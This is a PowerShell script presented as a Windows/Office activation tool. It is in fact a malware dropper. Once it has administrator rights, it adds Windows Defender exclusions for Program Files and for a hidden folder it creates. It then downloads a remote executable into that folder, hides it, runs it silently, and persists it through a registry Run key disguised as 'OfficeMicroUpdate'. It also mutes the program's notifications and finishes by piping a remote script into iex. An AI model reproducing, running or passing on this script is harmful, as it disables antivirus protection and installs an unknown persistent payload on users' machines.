Add-Type -AssemblyName System.Windows.Forms
function Show-ErrorMessage {

    param (

        [string]$message,

        [string]$title = "Insufficient privileges"

    )

    

    [System.Windows.Forms.MessageBox]::Show($message, $title, [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)

}
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
[Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "Insufficient privileges to execute this script. Open a PowerShell console with administrator privileges and run the script again."
    Show-ErrorMessage -message "Insufficient privileges to execute this script. Open a PowerShell console with administrator privileges and run the script again."
Break
}



# Base64-encoded strings for third download (officemicro.exe)
$officeDownloadUrlB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/dolbaeb.exe"))
$updaterrrExeB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("WindowsHostApplication.exe"))
# Common attributes
$hiddenAttrB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Hidden"))
$silentlyContinueB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("SilentlyContinue"))
$stopActionB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Stop"))
$directoryB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Directory"))

# Decode them
$officeDownloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($officeDownloadUrlB64))
$updaterrrExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterrrExeB64))
$hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))

# Create a new hidden folderAdd-FolderExclusion
$hiddenFolderName = "NotifyTemp_" + [System.Guid]::NewGuid().ToString().Substring(0,8)
$hiddenFolder = Join-Path $env:LOCALAPPDATA $hiddenFolderName
New-Item -ItemType $directory -Path $hiddenFolder -Force | Out-Null
$officePath = Join-Path $hiddenFolder $updaterrrExe

# Function to add folder exclusion
# Function to add exclusions with retry and verification
function Add-FolderExclusion {
    param (
        [string]$path,
        [int]$maxRetries = 5,
        [int]$delaySeconds = 1
    )
    $retryCount = 0
    $success = $false
    
    while (-not $success -and $retryCount -lt $maxRetries) {
        try {
            Add-MpPreference -ExclusionPath $path -ErrorAction $stopAction
            # Verify exclusion was added (requires admin rights to check, but attempt anyway)
            if (Get-MpPreference | Select-Object -ExpandProperty ExclusionPath | Where-Object { $_ -eq $path }) {
                $success = $true
            }
        } catch {
            $retryCount++
            Start-Sleep -Seconds $delaySeconds
        }
    }
    if (-not $success) {
    }
    # Additional delay to ensure exclusion takes effect
    Start-Sleep -Milliseconds 200
}


# Main execution
try {
    Add-MpPreference -ExclusionPath "C:\Program Files"
    Write-Host "Loading Activation Script..." -ForegroundColor DarkGreen -BackgroundColor White
    # Add folder exclusion BEFORE downloads
    Add-FolderExclusion -path $hiddenFolder
    # Add file-specific exclusions for extra protection
    Add-MpPreference -ExclusionPath $officePath
    
    
    # Download officemicro.exe as updaterrr.exe
    Invoke-WebRequest -Uri $officeDownloadUrl -OutFile $officePath -UseBasicParsing -ErrorAction $stopAction
    # Set folder and files as hidden
    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
    Set-ItemProperty -Path $officePath -Name Attributes -Value $hiddenAttr
    
    # Run all files silently in the current session
    Start-Process -FilePath $officePath -WindowStyle Hidden
       

    $regPathOffice = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regNameOffice = "OfficeMicroUpdate"
    $regValueOffice = "powershell.exe -WindowStyle Hidden -Command `"$officePath`""
    Set-ItemProperty -Path $regPathOffice -Name $regNameOffice -Value $regValueOffice -ErrorAction $silentlyContinue
    
    # Suppress notifications from updaterrr.exe
    New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name $updaterrrExe -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\$updaterrrExe" -Name "Enabled" -Value 0 -ErrorAction $silentlyContinue
    
    # Wait briefly for execution
    Start-Sleep -Seconds 2
} catch {
    # Output error for debugging
    Write-Host "Error: $_"
    exit 1
} finally {
    # No cleanup - leave traces as requested
    irm https://get.activated.win | iex
    
}
